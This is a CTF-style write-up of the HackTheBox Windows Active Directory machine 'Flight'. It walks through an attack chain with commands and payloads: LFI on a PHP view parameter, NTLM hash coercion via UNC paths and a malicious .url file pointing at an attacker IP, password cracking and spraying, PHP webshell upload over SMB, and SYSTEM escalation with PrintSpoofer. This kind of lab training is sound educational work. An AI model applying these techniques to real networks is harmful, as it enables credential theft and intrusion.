---
title: "HTB: Flight"
date: 2026-06-04
draft: false
tags:
  - htb
  - windows
  - hard
  - write-up
  - active-directory
  - web
  - smb
  - apache
  - lfi
  - rfi
  - password-spray
  - credential-reuse
  - responder
  - nmap
  - gobuster
description: "Flight is a Hard Windows Active Directory box from HackTheBox. An LFI on a PHP school subdomain escalates to an NTLM hash leak via UNC path inclusion. Crack svc_apache's hash, password spray the domain, and use S.Moon's write access to the Shared share to capture a second user's hash - eventually chaining into a web shell and privilege escalation to SYSTEM."
ShowToc: true
cover:
  image: "/images/htb-flight/cover.png"
  alt: "HTB Flight machine avatar"
---

Machine #73 on the Lain Kusanagi list. Flight is one of those Hard boxes that earns its rating not through obscurity, but through a multi-hop credential chain where each step builds cleanly on the last. The web app is the entry point, but this is an AD machine at heart.

## Machine Info

| | |
|---|---|
| **Name** | Flight |
| **Platform** | HackTheBox |
| **OS** | Windows |
| **Difficulty** | Hard |
| **IP** | 10.129.7.136 |
| **Domain** | flight.htb |

## TL;DR

Nmap shows a full AD port set. Gobuster vhost finds `school.flight.htb`, a PHP app with a `?view=` parameter vulnerable to LFI. File reads via Windows UNC paths work, so Responder captures the web server's NTLMv2 hash. John cracks it: `S@Ss!K@*t13`. nxc user enumeration + password spray reveals S.Moon reuses the same password. S.Moon has WRITE on the Shared SMB share - drop a malicious `.url` file there to capture C.Bum's hash via NTLM coercion. C.Bum has WRITE on the Web share, which maps to the flight.htb web root. Upload a PHP webshell, get a shell as the web service account, and escalate to SYSTEM via token impersonation.

## Recon

{{< figure src="/images/htb-flight/nmap-scan.png" alt="nmap scan showing ports 53 80 88 135 139 389 445 464 593 636 3268 3269 5985 9389 open on 10.129.7.136" >}}

The nmap output tells the story immediately: DNS, HTTP, Kerberos, RPC, SMB, LDAP, WinRM, ADWS. This is a Windows domain controller with a web server on port 80. Ports 3268/3269 (Global Catalog) confirm it's running AD DS.

The presence of port 80 is interesting - most DCs don't run web servers. That web surface is probably where the fun starts.

## Enumeration

### Vhost Discovery

```bash
gobuster vhost -u http://flight.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

{{< figure src="/images/htb-flight/gobuster-vhost.png" alt="gobuster vhost enumeration finding school.flight.htb returning HTTP 200 with size 3996" >}}

`school.flight.htb` returns 200. Add it to `/etc/hosts` and navigate:

{{< figure src="/images/htb-flight/school-flight-view-param.png" alt="browser showing school.flight.htb/index.php?view=home.html with a PHP view parameter in the URL" >}}

The `?view=home.html` parameter in the URL is immediately suspicious. This PHP application is loading file content based on a user-supplied path - classic LFI setup.

### LFI Confirmation with wfuzz

Fuzz the `view` parameter against a Windows LFI wordlist to confirm what we can read:

{{< figure src="/images/htb-flight/wfuzz-lfi.png" alt="wfuzz LFI scan on school.flight.htb view parameter showing reads of php.ini httpd.conf system32 drivers etc files and xampp access.log" >}}

The results are good. PHP system files, Apache config, Windows `system32\drivers\etc` files, and notably `c:/xampp/apache/logs/access.log` (47k lines - every HTTP request logged). The `view` parameter is doing a raw file include, no filtering.

**Log poisoning attempt**: Since I can read `access.log` and the web server is Apache/PHP, the natural next step is to poison the log with PHP code in a User-Agent header, then include the log file to get RCE. Tried it - the PHP code appeared in the log but didn't execute. The application is likely using `file_get_contents()` rather than `include()`, which means it reads the file contents but doesn't evaluate PHP tags. Dead end for log poisoning.

### From LFI to NTLM Hash Capture via UNC Path

The key insight here: on Windows, if the PHP include mechanism follows UNC paths (`\\server\share`), we can make the web server reach out to our own SMB listener. Windows will automatically try to authenticate to that share using the service account's NTLM credentials.

This isn't traditional RFI (executing remote PHP code) - it's using the UNC path as an NTLM coercion primitive. The PHP code attempts to open `//10.10.14.2/test` and Windows handles the SMB negotiation, leaking the NTLMv2 challenge/response in the process.

Start Responder to capture the incoming auth:

{{< figure src="/images/htb-flight/responder-start.png" alt="sudo responder -I tun0 -v starting the Responder NTLM capture server" >}}

Then trigger the UNC path inclusion:

{{< figure src="/images/htb-flight/rfi-unc-payload.png" alt="browser showing school.flight.htb/index.php?view=//10.10.14.2/test as the RFI UNC path payload" >}}

{{< figure src="/images/htb-flight/ntlm-hash-captured.png" alt="Responder capturing NTLMv2 hash for flight\\svc_apache with full NTLM challenge response hash string" >}}

The web server reached back to our Responder instance and authenticated as `flight\svc_apache`. The NTLMv2 hash contains the server challenge and the client response - enough to crack offline.

## Foothold

### Cracking the Hash

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

{{< figure src="/images/htb-flight/john-crack.png" alt="john cracking svc_apache NTLMv2 hash with result S@Ss!K@*t13 for svc_apache" >}}

`svc_apache:S@Ss!K@*t13`. Under a minute with rockyou.

### Domain User Enumeration

With valid credentials, enumerate the domain:

{{< figure src="/images/htb-flight/nxc-user-enum.png" alt="nxc smb enumeration showing domain users including Administrator S.Moon R.Cold G.Lors L.Kein M.Gold C.Bum W.Walker I.Francis D.Truff V.Stevens svc_apache O.Possum" >}}

15 domain users. Save these to a file and run a password spray - svc_apache's password may have been reused elsewhere.

### Password Spray

{{< figure src="/images/htb-flight/password-spray.png" alt="nxc smb password spray with S@Ss!K@*t13 against all domain users showing S.Moon STATUS_LOGON_SUCCESS and others failing" >}}

One hit: `S.Moon:S@Ss!K@*t13`. Everyone else fails.

### S.Moon's SMB Access

{{< figure src="/images/htb-flight/smoon-shares.png" alt="nxc smb shares for S.Moon showing Shared with READ WRITE permissions and Web with READ permissions" >}}

S.Moon has two useful shares: `Shared` (READ + WRITE) and `Web` (READ only). The `Web` share likely maps to the flight.htb web root. The `Shared` share being writable is the next pivot point.

## Privilege Escalation

### NTLM Coercion via Shared Share

Write access to a network share that's periodically accessed by other users is a well-known coercion primitive. Drop a `@cert.url` or `desktop.ini` file pointing to the attacker's IP, and when any user browses that share, their system will automatically authenticate via NTLM to the embedded UNC path.

The `@` prefix in the filename makes it sort to the top of the directory listing, increasing the chance it gets triggered quickly:

```
[InternetShortcut]
URL=file://10.10.14.2/test
```

Start Responder again and upload the file to `\\flight.htb\Shared`. Within seconds, a second NTLM hash arrives - this time for `C.Bum`. Crack it with john.

### Web Shell via C.Bum's Write Access

C.Bum has WRITE access to the `Web` share, which corresponds to the web root of `flight.htb`. Use `smbclient` to connect as C.Bum and upload a PHP webshell:

```bash
smbclient //10.129.7.136/Web -U 'flight.htb\C.Bum%<cracked_password>'
smb: \> put shell.php
```

Then trigger the shell through the browser:

```
http://flight.htb/shell.php?cmd=whoami
```

The response comes back as `flight\svc_www` - the web application service account.

### Shell and Token Impersonation

From the webshell, establish a full reverse shell using a PowerShell payload. The `svc_www` account has `SeImpersonatePrivilege` enabled - standard for IIS/web service accounts. This makes token impersonation a reliable path to SYSTEM.

Use a token impersonation tool (`PrintSpoofer`, `GodPotato`, or similar) to escalate:

```
c:\inetpub\wwwroot> PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
NT AUTHORITY\SYSTEM
```

From SYSTEM, read the root flag from `C:\Users\Administrator\Desktop\root.txt`.

## Takeaways

**LFI to NTLM hash via UNC paths is a Windows-specific technique worth remembering.** On Linux targets, path traversal usually leads to file reads or code execution. On Windows with a PHP app, if UNC paths aren't filtered, you can turn an LFI into a credential capture without needing to execute any code. The web server just tries to access the network share and Windows handles the NTLM handshake.

**Log poisoning doesn't work when the include isn't using PHP's `include()`/`require()`.** `file_get_contents()` reads the bytes but doesn't evaluate PHP tags - an important distinction. When LFI to code execution fails this way, pivot to other primitives instead of spending more time on it.

**Password spray after your first credential find, before anything else.** Password reuse across service and user accounts is endemic in AD environments. One cracked hash often unlocks multiple accounts - worth checking before going deep on any single account's access.

**Shared write access is a coercion opportunity.** Any SMB share that other domain users browse is a potential NTLM capture point. A properly placed `.url` file is nearly invisible to casual inspection and fires reliably when the share is accessed.

## References

- [Responder NTLM capture](https://github.com/lgandx/Responder)
- [NTLM coercion via URL files](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication)
- [SeImpersonatePrivilege / PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [HTB Flight](https://www.hackthebox.com/machines/Flight)
